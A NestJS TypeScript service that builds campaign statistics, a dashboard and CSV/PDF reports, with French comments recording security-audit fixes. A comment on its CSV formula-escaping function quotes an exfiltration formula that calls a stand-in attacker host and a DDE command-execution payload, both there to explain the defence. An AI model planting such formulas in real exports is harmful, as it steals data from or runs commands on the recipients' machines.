import {
  Injectable,
  NotFoundException,
  ForbiddenException,
} from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';
import { AuthenticatedUser } from '../auth/interfaces/authenticated-user.interface';
import { assertSameCompany } from '../auth/utils/company-scope.util';
import { StatistiqueFilterDto } from './dto/statistique-filter.dto';
import { DashboardResponseDto } from './dto/dashboard-response.dto';
import { CampaignStatus, BroadcastStatus, Prisma } from '@prisma/client';
import { Parser } from 'json2csv';
import PdfPrinter from 'pdfmake';
import type { TDocumentDefinitions } from 'pdfmake/interfaces';

/**
 * Nombre maximal de campagnes intégrées à un rapport global.
 *
 * La génération PDF (pdfmake) et CSV (json2csv) est un traitement CPU
 * SYNCHRONE : tant qu'il tourne, l'event loop Node est bloqué et le
 * processus ne répond plus à AUCUNE autre requête. Borner l'entrée est la
 * mitigation immédiate ; le traitement doit à terme migrer vers la file
 * BullMQ déjà en place (voir le plan d'action de l'audit).
 */
const MAX_REPORT_CAMPAIGNS = 500;

/** Projection minimale nécessaire au rapport — évite tout sur-transfert. */
const REPORT_SELECT = {
  id: true,
  name: true,
  status: true,
  plannedBudget: true,
  actualBudget: true,
  startDate: true,
  endDate: true,
  broadcasts: { select: { status: true } },
  installations: { select: { status: true } },
  launchedBy: { select: { companyId: true } },
} as const;

/**
 * Neutralise l'injection de formule dans un export CSV (« CSV injection » /
 * « formula injection », CWE-1236).
 *
 * CORRECTIF AUDIT (majeur) : `new Parser()` de json2csv échappe les
 * guillemets mais PAS les caractères qui font qu'Excel, LibreOffice ou Google
 * Sheets interprètent une cellule comme une FORMULE. Or `Campaign.name` est
 * une chaîne libre saisie par l'utilisateur et projetée telle quelle dans le
 * CSV. Un nom de campagne valant
 *   =HYPERLINK("https://attaquant.tld?d="&A1&A2&A3;"Rapport")
 * exfiltre le contenu du rapport dès que le fichier est ouvert par un
 * destinataire — typiquement le directeur marketing du tenant. Les variantes
 * `=cmd|'/c calc'!A0` permettent, selon la configuration du poste, une
 * exécution de commande.
 *
 * La parade standard consiste à préfixer d'une apostrophe toute valeur
 * débutant par un caractère déclencheur de formule.
 */
function escapeCsvFormula(value: string): string {
  if (value.length === 0) {
    return value;
  }
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

@Injectable()
export class StatistiquesService {
  private readonly pdfPrinter: PdfPrinter;

  constructor(private prisma: PrismaService) {
    // Initialize pdfmake with default Roboto fonts
    const fonts = {
      Roboto: {
        normal: 'Helvetica',
        bold: 'Helvetica-Bold',
        italics: 'Helvetica-Oblique',
        bolditalics: 'Helvetica-BoldOblique',
      },
    };
    this.pdfPrinter = new PdfPrinter(fonts);
  }

  // --------------------------------------------------------------
  // 1. Statistics for a single campaign (stored indicators)
  // --------------------------------------------------------------
  async getCampagneStatistiques(
    campaignId: string,
    user: AuthenticatedUser,
    filters: StatistiqueFilterDto,
  ) {
    // CORRECTIF AUDIT (mineur #12) : par cohérence avec les autres méthodes
    // de ce service (et du reste de l'application), on rejette
    // explicitement les utilisateurs sans entreprise plutôt que de laisser
    // `companyId: null` se propager dans la clause Prisma — un utilisateur
    // orphelin (jamais rattaché à une entreprise) ne doit avoir accès à
    // aucune statistique de campagne.
    if (!user.companyId) {
      throw new ForbiddenException(
        'You must belong to a company to view campaign statistics.',
      );
    }

    // Verify campaign access
    const campaign = await this.prisma.campaign.findFirst({
      where: {
        id: campaignId,
        launchedBy: { companyId: user.companyId },
      },
      include: { launchedBy: true },
    });
    if (!campaign) {
      throw new NotFoundException('Campaign not found.');
    }
    assertSameCompany(user, campaign.launchedBy.companyId, 'Campaign');

    // Build WHERE clause
    const where: Prisma.StatisticWhereInput = { campaignId };
    if (filters.indicator) {
      where.indicator = { contains: filters.indicator, mode: 'insensitive' };
    }
    if (filters.dateFrom || filters.dateTo) {
      where.computedAt = {};
      if (filters.dateFrom) where.computedAt.gte = new Date(filters.dateFrom);
      if (filters.dateTo) where.computedAt.lte = new Date(filters.dateTo);
    }

    const stats = await this.prisma.statistic.findMany({
      where,
      orderBy: { computedAt: 'desc' },
      take: filters.limit || 100,
      skip: filters.offset || 0,
    });

    return stats;
  }

  // --------------------------------------------------------------
  // 2. Enterprise-wide dashboard (multi-campaign overview)
  // --------------------------------------------------------------
  async getDashboard(user: AuthenticatedUser): Promise<DashboardResponseDto> {
    if (!user.companyId) {
      throw new ForbiddenException(
        'You must belong to a company to view the dashboard.',
      );
    }

    const companyId = user.companyId;

    // CORRECTIF AUDIT (mineur — recommandation performance) : seul le champ
    // `status` de `broadcasts`/`installations` est utilisé plus bas dans ce
    // calcul. Charger les lignes complètes (`include: true`) surchargeait
    // inutilement la mémoire et la bande passante réseau pour les tenants
    // ayant beaucoup de campagnes/diffusions/installations. On ne
    // sélectionne désormais que les champs réellement consommés.
    const campaigns = await this.prisma.campaign.findMany({
      where: {
        launchedBy: { companyId },
      },
      select: {
        id: true,
        name: true,
        status: true,
        plannedBudget: true,
        actualBudget: true,
        broadcasts: { select: { status: true } },
        installations: { select: { status: true } },
      },
    });

    // Compute metrics
    const totalCampaigns = campaigns.length;
    const statusCounts = campaigns.reduce(
      (acc, c) => {
        acc[c.status] = (acc[c.status] || 0) + 1;
        return acc;
      },
      {} as Record<CampaignStatus, number>,
    );

    // Budgets
    let totalPlannedBudget = 0;
    let totalActualBudget = 0;
    campaigns.forEach((c) => {
      totalPlannedBudget += c.plannedBudget.toNumber();
      totalActualBudget += c.actualBudget.toNumber();
    });
    const budgetDeviation = totalPlannedBudget - totalActualBudget;

    // Broadcast compliance (across all campaigns)
    let totalBroadcasts = 0;
    let totalBroadcasted = 0;
    campaigns.forEach((c) => {
      c.broadcasts.forEach((b) => {
        totalBroadcasts++;
        if (b.status === BroadcastStatus.BROADCASTED) totalBroadcasted++;
        // Note: missed/pending are not used in the dashboard response, but we keep them for potential future use.
      });
    });
    const complianceRate =
      totalBroadcasts > 0 ? totalBroadcasted / totalBroadcasts : 0;

    // Installations
    let totalInstallations = 0;
    let totalInstalled = 0;
    campaigns.forEach((c) => {
      c.installations.forEach((i) => {
        totalInstallations++;
        if (i.status === 'INSTALLED') totalInstalled++;
      });
    });
    const installationRate =
      totalInstallations > 0 ? totalInstalled / totalInstallations : 0;

    // Unread notifications for the current user
    const unreadNotifications = await this.prisma.notification.count({
      where: {
        recipientId: user.userId,
        readStatus: 'UNREAD',
      },
    });

    return {
      companyId,
      totalCampaigns,
      campaignsByStatus: statusCounts,
      totalPlannedBudget,
      totalActualBudget,
      budgetDeviation,
      complianceRate,
      installationRate,
      unreadNotifications,
      // Detailed summary for charting purposes
      campaignsSummary: campaigns.map((c) => ({
        id: c.id,
        name: c.name,
        status: c.status,
        plannedBudget: c.plannedBudget.toNumber(),
        actualBudget: c.actualBudget.toNumber(),
        broadcastCount: c.broadcasts.length,
        broadcastedCount: c.broadcasts.filter(
          (b) => b.status === BroadcastStatus.BROADCASTED,
        ).length,
        installationCount: c.installations.length,
        installedCount: c.installations.filter((i) => i.status === 'INSTALLED')
          .length,
      })),
    };
  }

  // --------------------------------------------------------------
  // 3. Report generation (CSV / PDF)
  // --------------------------------------------------------------
  async generateRapport(
    user: AuthenticatedUser,
    format: 'csv' | 'pdf',
    campagneId?: string,
  ): Promise<string | Buffer> {
    if (!user.companyId) {
      throw new ForbiddenException(
        'You must belong to a company to generate a report.',
      );
    }

    // Fetch data for the report
    let campaigns;
    if (campagneId) {
      const campaign = await this.prisma.campaign.findFirst({
        where: {
          id: campagneId,
          launchedBy: { companyId: user.companyId },
        },
        select: REPORT_SELECT,
      });
      if (!campaign) {
        throw new NotFoundException('Campaign not found.');
      }
      assertSameCompany(user, campaign.launchedBy.companyId, 'Campaign');
      campaigns = [campaign];
    } else {
      // CORRECTIF AUDIT (majeur — DoS) : ce `findMany` n'avait aucune borne.
      // Il rapatriait toutes les campagnes du tenant AVEC l'intégralité de
      // leurs diffusions, installations et preuves associées — un volume
      // croissant sans limite, entièrement matérialisé en mémoire, puis
      // sérialisé en PDF de façon synchrone (voir plus bas). `select` remplace
      // `include` pour ne transférer que les colonnes réellement projetées
      // dans le rapport.
      campaigns = await this.prisma.campaign.findMany({
        where: {
          launchedBy: { companyId: user.companyId },
        },
        select: REPORT_SELECT,
        orderBy: { createdAt: 'desc' },
        take: MAX_REPORT_CAMPAIGNS,
      });
    }

    // Transform into report rows
    const rows = campaigns.map((c) => ({
      'Campaign ID': c.id,
      // Seul champ librement saisi par l'utilisateur dans ce rapport : c'est
      // le vecteur d'injection de formule CSV.
      'Campaign Name': escapeCsvFormula(c.name),
      Status: c.status,
      'Planned Budget': c.plannedBudget.toNumber(),
      'Actual Budget': c.actualBudget.toNumber(),
      'Budget Deviation':
        c.plannedBudget.toNumber() - c.actualBudget.toNumber(),
      'Start Date': c.startDate.toISOString(),
      'End Date': c.endDate.toISOString(),
      'Total Broadcasts': c.broadcasts.length,
      Broadcasted: c.broadcasts.filter(
        (b) => b.status === BroadcastStatus.BROADCASTED,
      ).length,
      Missed: c.broadcasts.filter((b) => b.status === BroadcastStatus.MISSED)
        .length,
      Pending: c.broadcasts.filter((b) => b.status === BroadcastStatus.PLANNED)
        .length,
      'Total Installations': c.installations.length,
      Installed: c.installations.filter((i) => i.status === 'INSTALLED').length,
    }));

    if (format === 'csv') {
      const parser = new Parser();
      return parser.parse(rows);
    }

    // PDF generation
    const docDefinition: TDocumentDefinitions = {
      content: [
        { text: 'Liyanza - Performance Report', style: 'header' },
        {
          text: `Generated on ${new Date().toLocaleString()}`,
          style: 'subheader',
        },
        {
          table: {
            headerRows: 1,
            widths: ['*', '*', '*', '*', '*', '*'],
            body: [
              [
                'Campaign',
                'Status',
                'Planned Budget',
                'Actual Budget',
                'Deviation',
                'Compliance Rate',
              ],
              ...rows.map((r) => [
                r['Campaign Name'],
                r.Status,
                r['Planned Budget'],
                r['Actual Budget'],
                r['Budget Deviation'],
                // CORRECTIF AUDIT (mineur) : `|| 1` au dénominateur affichait
                // « 0% » pour une campagne sans aucune diffusion planifiée,
                // ce qui se lit comme un échec de conformité alors qu'il n'y a
                // simplement rien à mesurer. Et l'absence d'arrondi produisait
                // des cellules du type « 33.33333333333333% ».
                r['Total Broadcasts'] > 0
                  ? `${((r['Broadcasted'] / r['Total Broadcasts']) * 100).toFixed(1)}%`
                  : 'N/A',
              ]),
            ],
          },
        },
      ],
      styles: {
        header: { fontSize: 18, bold: true, margin: [0, 0, 0, 10] },
        subheader: { fontSize: 14, margin: [0, 0, 0, 20] },
      },
    };

    const pdfDoc = this.pdfPrinter.createPdfKitDocument(docDefinition);
    return new Promise<Buffer>((resolve, reject) => {
      const chunks: Buffer[] = [];
      pdfDoc.on('data', (chunk: Buffer) => chunks.push(chunk));
      pdfDoc.on('end', () => resolve(Buffer.concat(chunks)));
      pdfDoc.on('error', reject);
      pdfDoc.end();
    });
  }
}
